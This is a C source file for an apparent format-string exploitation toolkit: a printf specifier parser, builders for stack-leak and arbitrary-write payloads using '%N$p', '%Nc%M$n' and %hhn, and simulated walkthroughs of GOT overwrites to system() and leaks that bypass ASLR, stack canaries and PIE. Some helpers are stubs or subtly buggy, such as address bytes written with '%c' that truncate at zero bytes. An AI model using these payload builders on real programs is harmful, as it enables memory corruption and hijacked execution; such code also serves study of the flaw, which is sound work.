#include "format_string.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

/* ═══════════════════════════════════════════════════════════════
   Format String Parser
   ═══════════════════════════════════════════════════════════════ */

void fmt_parse_result_init(fmt_parse_result_t *r) {
    memset(r, 0, sizeof(*r));
}

void fmt_parse(const char *format_str, fmt_parse_result_t *r) {
    fmt_parse_result_init(r);
    r->str = format_str;

    for (const char *p = format_str; *p && r->count < FMT_MAX_SPECS; p++) {
        if (*p != '%') continue;
        p++;
        if (*p == '%') continue;  /* %% literal */

        fmt_spec_t *s = &r->specs[r->count++];

        /* Flags */
        while (*p == '+' || *p == '-' || *p == ' ' || *p == '0' || *p == '#') {
            switch (*p) {
            case '+': s->flag_plus  = true; break;
            case '-': s->flag_minus = true; break;
            case ' ': s->flag_space = true; break;
            case '0': s->flag_zero  = true; break;
            case '#': s->flag_alt   = true; break;
            }
            p++;
        }

        /* Position argument: %7$d */
        if (*p >= '1' && *p <= '9') {
            s->arg_position = (int)strtol(p, (char**)&p, 10);
            if (*p == '$') p++;
        }

        /* Width */
        if (*p == '*') {
            s->type = FMT_SPEC_WIDTH; p++;
        } else if (*p >= '1' && *p <= '9') {
            s->width = (int)strtol(p, (char**)&p, 10);
        }

        /* Precision */
        if (*p == '.') {
            p++;
            if (*p == '*') p++;
            else s->precision = (int)strtol(p, (char**)&p, 10);
        }

        /* Length modifier */
        if (*p == 'l') {
            s->length_mod = 'l'; p++;
            if (*p == 'l') { s->length_mod = 'L'; p++; }
        } else if (*p == 'h') {
            s->length_mod = 'h'; p++;
            if (*p == 'h') { s->length_mod = 'H'; p++; }
        } else if (*p == 'z') { s->length_mod = 'z'; p++; }
          else if (*p == 't') { s->length_mod = 't'; p++; }
          else if (*p == 'j') { s->length_mod = 'j'; p++; }

        /* Specifier character */
        switch (*p) {
        case 'd': case 'i':
            s->type = (s->length_mod == 'L') ? FMT_SPEC_LLONG :
                      (s->length_mod == 'l') ? FMT_SPEC_LONG  : FMT_SPEC_INT;
            break;
        case 'u': case 'x': case 'X': case 'o':
            s->type = (s->length_mod == 'L') ? FMT_SPEC_LLONG :
                      (s->length_mod == 'l') ? FMT_SPEC_LONG  : FMT_SPEC_INT;
            break;
        case 'p': s->type = FMT_SPEC_PTR;     break;
        case 's': s->type = FMT_SPEC_STR;     break;
        case 'c': s->type = FMT_SPEC_CHAR;    break;
        case 'n': s->type = FMT_SPEC_NWRITE;
                  r->has_n_write = true;
                  break;
        case 'f': case 'e': case 'g':
                  s->type = FMT_SPEC_FLOAT;   break;
        default:
            s->type = FMT_SPEC_NONE;
            break;
        }

        if (s->type == FMT_SPEC_PTR || s->type == FMT_SPEC_INT ||
            s->type == FMT_SPEC_LONG || s->type == FMT_SPEC_LLONG)
            r->has_leak = true;
    }
}

void fmt_print_spec(const fmt_spec_t *s) {
    printf("  Spec: type=%d width=%d prec=%d",
           s->type, s->width, s->precision);
    if (s->arg_position) printf(" pos=$%d", s->arg_position);
    if (s->length_mod)   printf(" len=%c", s->length_mod);
    printf(" flags:%s%s%s%s%s",
           s->flag_plus  ? "+" : "",
           s->flag_minus ? "-" : "",
           s->flag_space ? " " : "",
           s->flag_zero  ? "0" : "",
           s->flag_alt   ? "#" : "");
    if (s->type == FMT_SPEC_NWRITE) printf(" [%%n WRITE]");
    printf("\n");
}

void fmt_print_parse_result(const fmt_parse_result_t *r) {
    printf("\n─── Format String Parse: \"%s\" ───\n", r->str);
    printf("  Specifiers: %d  (%%n: %s, Leak: %s)\n",
           r->count,
           r->has_n_write ? "YES" : "NO",
           r->has_leak     ? "YES" : "NO");
    for (int i = 0; i < r->count; i++)
        fmt_print_spec(&r->specs[i]);
}

/* ═══════════════════════════════════════════════════════════════
   Attack Payload Generation
   ═══════════════════════════════════════════════════════════════ */

fmt_payload_t fmt_build_leak_payload(int offset) {
    fmt_payload_t p;
    memset(&p, 0, sizeof(p));
    /* Build "%offset$p" to leak the value at that stack offset */
    int written = snprintf(p.payload, FMT_PAYLOAD_MAX,
                           "%%%d$p", offset);
    p.len = (size_t)(written > 0 ? written : 0);
    p.valid = (written > 0);
    return p;
}

fmt_payload_t fmt_build_write_payload(int offset, void *addr, uint64_t val) {
    fmt_payload_t p;
    memset(&p, 0, sizeof(p));

    /* Strategy: embed target address at the start, then use %offset$n */
    int pos = 0;
    /* Write the target address bytes (8 bytes for 64-bit) */
    for (int i = 0; i < 8; i++) {
        pos += snprintf(p.payload + pos, FMT_PAYLOAD_MAX - (size_t)pos,
                        "%c", ((char*)&addr)[i]);
    }

    /* Padding to reach the desired byte count */
    uint32_t pad = (val > 8) ? (uint32_t)val - 8 : 0;
    pos += snprintf(p.payload + pos, FMT_PAYLOAD_MAX - (size_t)pos,
                    "%%%uc%%%d$n", pad, offset);

    p.len = (size_t)pos;
    p.valid = (pos > 0);
    return p;
}

fmt_payload_t fmt_build_dpa_write(int dpa_pos, void *addr, uint64_t val) {
    fmt_payload_t p;
    memset(&p, 0, sizeof(p));

    /* Direct Parameter Access: address followed by %Nc%pos$n */
    int pos = 0;
    /* Copy target address as raw bytes */
    memcpy(p.payload, &addr, sizeof(void*));
    pos += sizeof(void*);

    /* Generate format specifier */
    uint32_t chars_before = (uint32_t)sizeof(void*);
    uint32_t pad_needed = (val > chars_before) ? (uint32_t)val - chars_before : 0;
    pos += snprintf(p.payload + pos, FMT_PAYLOAD_MAX - (size_t)pos,
                    "%%%uc%%%d$n", pad_needed, dpa_pos);

    p.len = (size_t)pos;
    p.valid = true;
    printf("[FMT-DPA] Payload (%zu bytes): %% %d-character pad -> %%n write to %p\n",
           p.len, pad_needed, addr);
    return p;
}

fmt_payload_t fmt_build_got_overwrite(int offset, fmt_got_entry_t *got, int count) {
    (void)offset; (void)got; (void)count;
    fmt_payload_t p;
    memset(&p, 0, sizeof(p));
    printf("[FMT-GOT] GOT overwrite strategy:\n");
    printf("  1. Leak libc base via format string (%%p).\n");
    printf("  2. Calculate system() address.\n");
    printf("  3. Use %%hhn writes (single-byte) to overwrite GOT entry.\n");
    printf("  4. Write address in 2-byte chunks (or 1-byte for precision).\n");
    printf("  5. Trigger the hijacked function (e.g., puts@GOT -> system).\n");
    return p;
}

fmt_payload_t fmt_build_stack_leak(int offset, int num_leaks) {
    fmt_payload_t p;
    memset(&p, 0, sizeof(p));
    int pos = 0;
    for (int i = 0; i < num_leaks; i++) {
        pos += snprintf(p.payload + pos, FMT_PAYLOAD_MAX - (size_t)pos,
                        "%%%d$p|", offset + i);
    }
    p.len = (size_t)pos;
    p.valid = (pos > 0);
    return p;
}

/* ═══════════════════════════════════════════════════════════════
   Write Primitive Calculation
   ═══════════════════════════════════════════════════════════════ */

void fmt_calc_write_primitive(uint64_t target_val,
                               fmt_write_primitive_t *wp) {
    memset(wp, 0, sizeof(*wp));
    wp->target_value = (uint32_t)target_val;

    /* Byte-by-byte via %hhn */
    wp->incremental = true;
    wp->num_writes = 4; /* 4 x %hhn = 4 bytes for 32-bit value */

    printf("[FMT-WRITE] To write 0x%08X:\n", wp->target_value);
    printf("  Byte 0: 0x%02X\n", (wp->target_value)       & 0xFF);
    printf("  Byte 1: 0x%02X\n", (wp->target_value >> 8)  & 0xFF);
    printf("  Byte 2: 0x%02X\n", (wp->target_value >> 16) & 0xFF);
    printf("  Byte 3: 0x%02X\n", (wp->target_value >> 24) & 0xFF);
}

void fmt_calc_width_bytes(uint32_t *vals, int count,
                           char *buf, size_t buf_len) {
    uint32_t written = 0;
    size_t pos = 0;
    for (int i = 0; i < count && pos < buf_len; i++) {
        uint32_t needed = (vals[i] > written) ? vals[i] - written
                           : (vals[i] + 256) - written;
        pos += (size_t)snprintf(buf + pos, buf_len - pos,
                                "%%%uc%%hhn", needed);
        written += needed;
    }
}

/* ═══════════════════════════════════════════════════════════════
   DPA Helpers
   ═══════════════════════════════════════════════════════════════ */

int fmt_dpa_calc_offset(const char *fmt, int param_num) {
    fmt_parse_result_t r;
    fmt_parse(fmt, &r);
    for (int i = 0; i < r.count; i++) {
        if (r.specs[i].arg_position == param_num)
            return i + 1;  /* 1-indexed stack argument offset */
    }
    return -1;
}

bool fmt_dpa_is_supported(void) {
    return true;  /* POSIX printf supports %n$ */
}

/* ═══════════════════════════════════════════════════════════════
   Printf Simulation
   ═══════════════════════════════════════════════════════════════ */

void fmt_simulate_printf(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    fmt_simulate_vprintf(fmt, ap);
    va_end(ap);
}

void fmt_simulate_vprintf(const char *fmt, va_list ap) {
    fmt_parse_result_t r;
    fmt_parse(fmt, &r);
    int count = 0;

    for (int i = 0; i < r.count; i++) {
        fmt_spec_t *s = &r.specs[i];
        switch (s->type) {
        case FMT_SPEC_PTR:
            printf("[FMT-SIM] %%p: 0x%p (argument %d)\n",
                   va_arg(ap, void*), i + 1);
            count += 14;  /* approx chars for "0x7FFF...." */
            break;
        case FMT_SPEC_NWRITE:
            printf("[FMT-SIM] %%n: would write %d to target\n", count);
            {
                void *target = va_arg(ap, void*);
                printf("[FMT-SIM] %%n target: %p\n", target);
            }
            break;
        case FMT_SPEC_INT:
        case FMT_SPEC_LONG:
        case FMT_SPEC_LLONG:
            printf("[FMT-SIM] integer spec (argument %d)\n", i + 1);
            (void)va_arg(ap, int);  /* consume argument */
            count += 8;
            break;
        case FMT_SPEC_STR:
            printf("[FMT-SIM] %%s: \"%s\"\n", va_arg(ap, const char*));
            count += 8;
            break;
        default:
            break;
        }
    }
}

uint32_t fmt_simulate_read_n(void *target, const char *fmt, int offset) {
    (void)target; (void)fmt; (void)offset;
    printf("[FMT-READ-N] %%n would write current character count to %p\n",
           target);
    printf("[FMT-READ-N] Format: \"%s\", offset: %d\n", fmt, offset);
    return 1234;  /* mock character count */
}

/* ═══════════════════════════════════════════════════════════════
   Leak Simulation
   ═══════════════════════════════════════════════════════════════ */

void fmt_simulate_leak_stack(int offset, int count) {
    printf("[FMT-LEAK] Reading %d values from format string arg offset %d:\n",
           count, offset);
    for (int i = 0; i < count; i++) {
        uint64_t mock_val = 0x7FFF12340000ULL + (uint64_t)((offset + i) * 8 * 256);
        printf("  Stack[%d] (offset %%%d$p): 0x%016llX\n",
               i, offset + i, (unsigned long long)mock_val);
    }
    printf("[FMT-LEAK] Common leak targets:\n");
    printf("  - __libc_start_main+ret -> libc base (bypass ASLR)\n");
    printf("  - Stack canary value -> bypass stack protection\n");
    printf("  - PIE base address -> bypass PIE\n");
    printf("  - Heap pointers -> heap address leak\n");
}

uint64_t fmt_simulate_leak_addr(int offset) {
    uint64_t mock = 0x7FFFF7000000ULL + (uint64_t)(offset * 0x1000);
    printf("[FMT-LEAK] Simulated leak at offset %d: 0x%016llX\n",
           offset, (unsigned long long)mock);
    return mock;
}

void fmt_got_leak_simulate(const char *func_name, int offset) {
    (void)func_name; (void)offset;
    printf("[FMT-GOT-LEAK] Leaking GOT entry for \"%s\":\n", func_name);
    printf("  1. Use format string to read GOT value.\n");
    printf("  2. Subtract known libc offset to get libc base.\n");
    printf("  3. Add system() offset to get system() address.\n");
    printf("  4. Overwrite GOT entry with system() via %%n writes.\n");
}

/* ═══════════════════════════════════════════════════════════════
   Payload Utilities
   ═══════════════════════════════════════════════════════════════ */

int fmt_calc_pad_bytes(uint32_t current, uint32_t target) {
    if (target > current) return (int)(target - current);
    return (int)(target + 256 - current);
}

void fmt_embed_address(char *buf, void *addr, size_t buf_len) {
    if (buf_len >= sizeof(void*))
        memcpy(buf, &addr, sizeof(void*));
}

bool fmt_payload_has_null(const char *payload) {
    for (int i = 0; i < 64; i++)
        if (payload[i] == '\0') return true;
    return false;
}
